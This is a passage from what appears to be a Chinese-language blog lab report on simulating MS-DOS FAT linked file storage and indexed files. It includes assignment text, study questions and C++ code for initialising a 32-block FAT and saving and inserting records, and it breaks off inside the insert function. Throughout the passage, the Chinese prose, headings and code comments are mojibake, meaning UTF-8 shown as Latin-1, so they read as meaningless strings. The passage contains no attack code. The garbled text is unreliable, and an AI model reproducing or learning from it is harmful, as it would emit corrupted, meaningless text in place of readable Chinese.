éœ€å†æŒ‡å‡ºè¦è®¿é—®çš„è®°å½•å·ã€‚</p></li><li><p>é‡‡ç”¨é“¾æ¥æ–‡ä»¶ç»“æ„ï¼Œåªæœ‰è¯»å‡ºä¸€ä¸ªç‰©ç†å—ä¿¡æ¯åæ‰èƒ½ä»é“¾æ¥å­—ä¸­å¾—çŸ¥ä¸‹ä¸€ä¸ªç‰©ç†å—å·ã€‚æ‰€ä»¥ï¼Œå½“ç”¨æˆ·è¦åœ¨æ–‡ä»¶ä¸­æ’å…¥ä¸€äº›ä¿¡æ¯æ—¶ï¼Œæ–‡ä»¶ç³»ç»Ÿå¿…é¡»å¤šæ¬¡åœ°è¯·æ±‚å¯åŠ¨ç£ç›˜è¯»å‡ºä¿¡æ¯æ‰èƒ½åšæ’å…¥å·¥ä½œã€‚</p><p>MS-DOSæ“ä½œç³»ç»Ÿå¯¹é“¾æ¥æ–‡ä»¶ç»“æ„ä½œäº†æ”¹è¿›ï¼Œå®ƒæ˜¯æŠŠæ‰€æœ‰çš„é“¾æ¥æŒ‡é’ˆé›†ä¸­åœ¨ä¸€èµ·ï¼Œå­˜æ”¾åœ¨æ–‡ä»¶å®šä½è¡¨FATä¸­ã€‚æŸ¥æ‰¾é“¾æ¥å­—æ—¶ä¸å¿…è¯»å‡ºç‰©ç†å—ä¿¡æ¯å¯ç›´æ¥ä»FATä¸­å¾—åˆ°ã€‚</p></li></ol><ul><li>å…¶è®¾è®¡æ€æƒ³æ˜¯ï¼š<br>å‡å®šç£ç›˜ä¸Šå…±æœ‰Nä¸ªç‰©ç†å—å¯ä¾›ä½¿ç”¨ï¼ŒFATå°±æœ‰Né¡¹ï¼Œåˆå§‹åŒ–æ—¶ä¸ºå…¨â€œ0â€ï¼Œè¡¨ç¤ºå¯¹åº”çš„ç‰©ç†å—å‡å¯ä½¿ç”¨ï¼Œå½“è¦å­˜æ”¾æ–‡ä»¶æ—¶ï¼Œä»FATä¸­å¯»æ‰¾ä¸ºâ€œ0â€çš„é¡¹ï¼Œå…¶å¯¹åº”çš„ç‰©ç†å—ç”¨æ¥å­˜æ”¾æ–‡ä»¶ä¿¡æ¯ï¼ŒæŠŠæ–‡ä»¶çš„é“¾æ¥æŒ‡é’ˆï¼ˆæŒ‡å‡ºç‰©ç†å—å·ï¼‰ç™»è®°åœ¨FATä¸­ï¼Œæ–‡ä»¶ç¬¬ä¸€å—å—å·ç™»è®°åœ¨æ–‡ä»¶ç›®å½•ä¸­ã€‚</li></ul><p><img src="/posts/6255939a/image-20211217135713687.png" alt="image-20211217135713687"></p><ol start="3"><li>å‡å®šç£ç›˜å­˜å‚¨ç©ºé—´å…±æœ‰32ä¸ªç‰©ç†å—ï¼Œæ¨¡æ‹Ÿè®¾è®¡æ–‡ä»¶å®šä½è¡¨FATã€‚æ–‡ä»¶å®šä½è¡¨å¯ä»¥ç”¨ä¸€ä¸ªä¸€ç»´æ•°ç»„FAT[031]æ¥å®šä¹‰ï¼Œå…¶ä¸­ä¸€ä¸ªå…ƒç´ ä¸ä¸€ä¸ªç‰©ç†å—å¯¹åº”ã€‚å½“FAT[i]=0æ—¶ï¼Œè¡¨ç¤ºç¬¬iå—ä¸ºç©ºé—²å—ï¼›å½“FAT[i]=FFFæ—¶ï¼Œè¡¨ç¤ºé“¾æ¥æ–‡ä»¶åˆ°ç¬¬iå—ç»“æŸï¼›å½“åœ¨0~FFFæ—¶ï¼Œå…¶å€¼æŒ‡ç¤ºé“¾æ¥æ–‡ä»¶ä¸­ä¸‹ä¸€ä¸ªç‰©ç†å—å·ã€‚</li><li>æ¯ä¸ªç‰©ç†å—åªèƒ½å­˜æ”¾ä¸€ä¸ªé€»è¾‘è®°å½•ï¼Œè®¾è®¡ä¸€ä¸ªç¨‹åºæŠŠæ–‡ä»¶çš„é€»è¾‘ç»“æ„æ¨¡æ‹Ÿè½¬æ¢æˆMS-DOSçš„é“¾æ¥ç»“æ„ã€‚</li></ol><ul><li>è¦æ±‚ä¿å­˜ä¸€ä¸ªå·²ç»åœ¨1 1ä¸»å­˜ä¸­çš„æ–‡ä»¶æ—¶ï¼Œç»™å‡ºæ–‡ä»¶åå’Œæ–‡ä»¶çš„é€»è¾‘è®°å½•é•¿åº¦åŠä¸ªæ•°ï¼Œå¯¹ä¸€ä¸ªå·²ç»ä¿å­˜çš„æ–‡ä»¶ï¼Œå…è®¸ç”¨æˆ·æ’å…¥æ–°è®°å½•ã€‚ç”¨é”®ç›˜è¾“å…¥æ¥æ¨¡æ‹Ÿç”¨æˆ·çš„è¦æ±‚ï¼Œè¾“å…¥ä¿¡æ¯ä¸ºï¼š<br>â€œå­˜â€ æ–‡ä»¶å é€»è¾‘è®°å½•é•¿åº¦ é€»è¾‘è®°å½•ä¸ªæ•°â€œæ’å…¥â€ æ–‡ä»¶å é€»è¾‘è®°å½•å·</li><li>æ¨¡æ‹Ÿç¨‹åºçš„ç®—æ³•å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><p><img src="/posts/6255939a/image-20211217135808878.png" alt="image-20211217135808878"></p><ol start="5"><li>å‡è®¾ç³»ç»Ÿä¸­å·²ç»æœ‰ä¸¤ä¸ªé“¾æ¥æ–‡ä»¶ï¼Œå…¶é“¾æ¥æƒ…å†µç”±FATè¡¨æŒ‡å‡ºï¼ˆé“¾æ¥æƒ…å†µå­¦ç”Ÿè‡ªå®š)ï¼Œç°åˆè¦ä¿å­˜ä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œç„¶åå¯¹å·²ä¿å­˜çš„æ–‡ä»¶æ’å…¥ä¸€ä¸ªæ–°è®°å½•ã€‚è¿è¡Œä½ æ‰€è®¾è®¡çš„ç¨‹åºï¼Œè§‚å¯Ÿå…¶ç»“æœã€‚</li></ol><h3 id="ç¬¬äºŒé¢˜"><a class="markdownIt-Anchor" href="#ç¬¬äºŒé¢˜"></a> ç¬¬äºŒé¢˜ï¼š</h3><p><strong>æ¨¡æ‹Ÿä¾¿äºç›´æ¥å­˜å–çš„ç´¢å¼•æ–‡ä»¶ç»“æ„</strong></p><ol><li><p>ç´¢å¼•æ–‡ä»¶åƒé“¾æ¥æ–‡ä»¶ä¸€æ ·ï¼Œæ–‡ä»¶çš„é€»è¾‘è®°å½•ä¿¡æ¯å¯å­˜æ”¾åœ¨éè¿ç»­çš„ç£ç›˜å­˜å‚¨ç©ºé—´ä¸­ã€‚ä½†è¿™äº›å­˜æ”¾é€»è¾‘è®°å½•çš„å­˜å‚¨ç©ºé—´ä¸æ˜¯æŒ‰é“¾è¡¨çš„å½¢å¼é“¾æ¥åœ¨ä¸€èµ·çš„ï¼Œè€Œæ˜¯é‡‡ç”¨ç´¢å¼•è¡¨æ¥æŒ‡å‡ºé€»è¾‘è®°å½•å­˜æ”¾çš„ç‰©ç†ä½ç½®ã€‚</p></li><li><p>æ–‡ä»¶ç›®å½•ä¸ç´¢å¼•è¡¨çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/posts/6255939a/image-20211219192945145.png" alt="image-20211219192945145"></p></li><li><p>å»ºç«‹ç´¢å¼•æ–‡ä»¶çš„è¿‡ç¨‹æ˜¯ï¼šå¯»æ‰¾ä¸€äº›ç©ºé—²ç‰©ç†å—ï¼›é€»è¾‘è®°å½•å­˜å…¥è¿™äº›ç‰©ç†å—ä¸­ï¼›æŠŠé€»è¾‘è®°å½•ä¸ç‰©ç†å—çš„å¯¹åº”å…³ç³»ç™»è®°åœ¨ç´¢å¼•è¡¨ä¸­ã€‚</p></li></ol><h3 id="æ€è€ƒé¢˜"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜"></a> æ€è€ƒé¢˜ï¼š</h3><ol><li>é“¾è¡¨æ–‡ä»¶ç»“æ„å’Œç´¢å¼•æ–‡ä»¶ç»“æ„å„è‡ªçš„ä¼˜ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>å½“æ–‡ä»¶è¾ƒå¤§æ—¶ï¼Œä½¿å¾—ç´¢å¼•è¡¨ä¹Ÿè¾ƒå¤§ï¼Œå¦‚æœç´¢å¼•è¡¨çš„å¤§å°è¶…è¿‡äº†ä¸€ä¸ªç‰©ç†å—ï¼Œå¦‚ä½•è¿›è¡Œç´¢å¼•è¡¨çš„å­˜å–ï¼Ÿ</li></ol><h2 id="å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"></a> å››ã€å®éªŒè®¾è®¡ä¸è¿‡ç¨‹</h2><h3 id="ç¬¬ä¸€é¢˜ms-dosç£ç›˜æ–‡ä»¶å­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€é¢˜ms-dosç£ç›˜æ–‡ä»¶å­˜å‚¨ç»“æ„"></a> ç¬¬ä¸€é¢˜ï¼šMS-DOSç£ç›˜æ–‡ä»¶å­˜å‚¨ç»“æ„</h3><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"></a> <strong>æ•°æ®ç»“æ„</strong>å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//æ–‡ä»¶å®šä½è¡¨ fat</span><br><span class="hljs-keyword">int</span> fat[<span class="hljs-number">32</span>];<br><span class="hljs-keyword">char</span> phy_file[<span class="hljs-number">32</span>];<br><span class="hljs-comment">//ä¸»å­˜å‰©ä½™å—çš„æ•°é‡</span><br><span class="hljs-keyword">int</span> leftblocks = <span class="hljs-number">32</span>;<br><span class="hljs-comment">//æ–‡ä»¶ç›®å½•</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FD</span></span><br><span class="hljs-class">&#123;</span><br>    string name[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ–‡ä»¶èµ·å§‹å—å·</span><br>    <span class="hljs-keyword">int</span> start[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ¯ä¸ªæ–‡ä»¶é€»è¾‘é•¿åº¦</span><br>    <span class="hljs-keyword">int</span> filelength[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ–‡ä»¶æ•°é‡</span><br>    <span class="hljs-keyword">int</span> filenum;<br>&#125; fd;<br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜"></a> å‡½æ•°è¯´æ˜</h4><p>ä¸€ä¸ªå­˜æ–‡ä»¶å‡½æ•°å’Œä¸€ä¸ªæ’å…¥æ–‡ä»¶å‡½æ•°ï¼Œæ¨¡æ‹Ÿé“¾è¡¨å®ç°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//åˆå§‹åŒ–å‡½æ•°ï¼Œé‡ç½® fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//å­˜æ–‡ä»¶æ“ä½œ</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//æ’å…¥æ–‡ä»¶æ“ä½œ</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç "><a class="markdownIt-Anchor" href="#æºä»£ç "></a> æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// MS-DOS ç£ç›˜æ–‡ä»¶å­˜å‚¨ç»“æ„</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">//æ–‡ä»¶å®šä½è¡¨ fat</span><br><span class="hljs-keyword">int</span> fat[<span class="hljs-number">32</span>];<br><span class="hljs-keyword">char</span> phy_file[<span class="hljs-number">32</span>];<br><span class="hljs-comment">//ä¸»å­˜å‰©ä½™å—çš„æ•°é‡</span><br><span class="hljs-keyword">int</span> leftblocks = <span class="hljs-number">32</span>;<br><span class="hljs-comment">//æ–‡ä»¶ç›®å½•</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FD</span></span><br><span class="hljs-class">&#123;</span><br>    string name[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ–‡ä»¶èµ·å§‹å—å·</span><br>    <span class="hljs-keyword">int</span> start[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//æ–‡ä»¶æ•°é‡</span><br>    <span class="hljs-keyword">int</span> filelength[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> filenum;<br>&#125; fd;<br><br><span class="hljs-comment">//åˆå§‹åŒ–å‡½æ•°ï¼Œé‡ç½® fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        fat[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//å°†ç¬¬ä¸€ä½è®¾ç½®ä¸º FDF</span><br>    fat[<span class="hljs-number">0</span>] = <span class="hljs-number">-2</span>;<br>    <span class="hljs-comment">//å°†ç¬¬äºŒä½è®¾ç½®æˆæ‰€æœ‰æ–‡ä»¶çš„ç»“æŸ FFF</span><br>    fat[<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>    leftblocks -= <span class="hljs-number">2</span>;<br>    fd.filenum = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name &lt;&lt; endl;</span><br>    fd.name[++fd.filenum] = <span class="hljs-string">&quot;AB&quot;</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name[fd.filenum] &lt;&lt; endl;</span><br>    fd.start[fd.filenum] = <span class="hljs-number">2</span>;<br>    fat[<span class="hljs-number">2</span>] = <span class="hljs-number">5</span>; <span class="hljs-comment">//åˆå§‹åŒ–ç¬¬ä¸€ä¸ªæ–‡ä»¶</span><br>    fat[<span class="hljs-number">5</span>] = <span class="hljs-number">8</span>;<br>    fat[<span class="hljs-number">8</span>] = <span class="hljs-number">11</span>;<br>    fat[<span class="hljs-number">11</span>] = <span class="hljs-number">18</span>;<br>    fat[<span class="hljs-number">18</span>] = <span class="hljs-number">24</span>;<br>    fat[<span class="hljs-number">24</span>] = <span class="hljs-number">1</span>;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">6</span>;<br><br>    fd.name[++fd.filenum] = <span class="hljs-string">&quot;B&quot;</span>; <span class="hljs-comment">//åˆå§‹åŒ–ç¬¬äºŒä¸ªæ–‡ä»¶</span><br>    fd.start[fd.filenum] = <span class="hljs-number">6</span>;<br>    fat[<span class="hljs-number">6</span>] = <span class="hljs-number">9</span>;<br>    fat[<span class="hljs-number">9</span>] = <span class="hljs-number">14</span>;<br>    fat[<span class="hljs-number">14</span>] = <span class="hljs-number">19</span>;<br>    fat[<span class="hljs-number">19</span>] = <span class="hljs-number">22</span>;<br>    fat[<span class="hljs-number">22</span>] = <span class="hljs-number">28</span>;<br>    fat[<span class="hljs-number">28</span>] = <span class="hljs-number">30</span>;<br>    fat[<span class="hljs-number">30</span>] = <span class="hljs-number">1</span>;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">7</span>;<br>&#125;<br><br><span class="hljs-comment">//å¯»æ‰¾ç›¸åŒæ–‡ä»¶åçš„æ¡ç›®</span><br><span class="hljs-comment">//æ‰¾åˆ°å°±è¿”å›åœ¨æ–‡ä»¶ç›®å½•ä¸­çš„ç´¢å¼•</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">FindFile</span><span class="hljs-params">(string filename)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-keyword">if</span> (fd.name[i] == filename)<br>            <span class="hljs-keyword">return</span> i;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//å­˜æ–‡ä»¶æ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥æ–‡ä»¶å: &quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//é¦–å…ˆå¯»æ‰¾æ˜¯ä¸æ˜¯æœ‰åŒåçš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//å¦‚æœæœ‰åˆ™ä¸èƒ½é‡å¤æ’å…¥</span><br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥é€»è¾‘è®°å½•é•¿åº¦: &quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FindFile</span>(filename) != <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********å­˜åœ¨åŒåæ–‡ä»¶ï¼Œå­˜æ“ä½œæ‰§è¡Œå¤±è´¥ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//æ£€æŸ¥å†…å­˜å‰©ä½™çš„ç©ºé—´æ˜¯ä¸æ˜¯å¤Ÿå­˜å‚¨</span><br>    <span class="hljs-keyword">if</span> (num &gt; leftblocks)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********å­˜å‚¨çš„æ–‡ä»¶è¿‡å¤§ï¼Œæ— æ³•å­˜å‚¨ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//è®°å½•æ–‡ä»¶åç§°</span><br>    fd.name[++fd.filenum] = filename;<br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-number">0</span>, lastpos;<br>    <span class="hljs-comment">//æ‰¾ num ä¸ªç©ºçš„å†…å­˜å—æ¥å­˜å‚¨ï¼ŒåŒæ—¶æ›´æ–°ç´¢å¼•</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)<br>    &#123;<br>        <span class="hljs-comment">//æ‰¾åˆ°ä¸€ä¸ªç©ºçš„ä½ç½®</span><br>        <span class="hljs-keyword">while</span> (fat[pos] != <span class="hljs-number">0</span>)<br>            pos = (pos + <span class="hljs-number">1</span>) % <span class="hljs-number">32</span>;<br>        <span class="hljs-comment">//å¦‚æœæ˜¯æ–‡ä»¶çš„èµ·å§‹å—å·åˆ™ç›´æ¥å­˜å‚¨ä¸‹ä¸€ä¸ªå—çš„ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>            fd.start[fd.filenum] = pos;<br>        <span class="hljs-comment">//ä¸æ˜¯èµ·å§‹å—åˆ™å°†ä¸Šä¸€ä¸ªå—çš„ç´¢å¼•è®¾ç½®æˆå½“å‰çš„åœ°å€</span><br>        <span class="hljs-keyword">else</span><br>            fat[lastpos] = pos;<br>        <span class="hljs-comment">//è®°å½•å½“å‰åœ°å€ï¼Œå®é™…çš„å¤åˆ¶å†…å®¹ç”±ä¸‹ä¸€ä¸ªå—çš„åœ°å€å†³å®š</span><br>        lastpos = pos;<br>        <span class="hljs-comment">//ä»ä¸‹ä¸€ä¸ªå—å¼€å§‹æ‰¾ï¼Œç©ºå‡ºå½“å‰åœ°å€ç•™å¾…ä½¿ç”¨</span><br>        pos++;<br>        <span class="hljs-comment">//å‰©ä½™çš„å—å°‘ä¸€ä¸ª</span><br>        leftblocks--;<br>    &#125;<br>    <span class="hljs-comment">//å°†æ–‡ä»¶çš„ç»“å°¾æ‰§è¡Œç»Ÿä¸€çš„ç»“æŸç¬¦ FFF</span><br>    fat[lastpos] = <span class="hljs-number">1</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********æ–‡ä»¶å­˜å‚¨æˆåŠŸï¼********&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//æ’å…¥æ–‡ä»¶æ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥æ–‡ä»¶å:&quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//é¦–å…ˆæŸ¥æ‰¾æ–‡ä»¶ç›®å½•ä¸­æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶</span><br>    <span class="hljs-comment">//å¦‚æœæœ‰è¿™ä¸ªæ–‡ä»¶åˆ™è®°å½•åœ¨æ–‡ä»¶ç›®å½•ä¸­çš„ç´¢å¼•</span><br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">FindFile</span>(filename);<br>    <span class="hljs-comment">//å¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶åˆ™æ’å…¥ä¸èƒ½å®Œæˆ</span><br>    <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œæ’å…¥å¤±è´¥ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//å°†è¿™ä¸ªå—æ’å…¥åˆ°æ–‡ä»¶çš„ç¬¬ num ä¸ªä½ç½®</span><br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¦æ’å…¥çš„æ–‡ä»¶é€»è¾‘ä½ç½®:&quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦æœ‰ç©ºé—´å­˜å‚¨è¿™ä¸ªæ’å…¥çš„å—</span><br>    <span class="hljs-keyword">if</span> (leftblocks == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********æ— ç©ºé—²å—ï¼Œæ’å…¥å¤±è´¥ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//æ‰¾ä¸€ä¸ªç©ºé—²çš„ä½ç½®æ¥å­˜æ”¾è¦æ’å…¥çš„å—</span><br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (fat[p] != <span class="hljs-number">0</span>)<br>        p++;<br>    <span class="hljs-comment">//å¦‚æœè¦åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥ï¼Œåˆ™æ›´æ–°èµ·å§‹å—å·</span><br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>)<br>    &#123;<br>        fat[p] = fd.start[pos];<br>        fd.start[pos] = p;<br>    &#125;<br>    <span 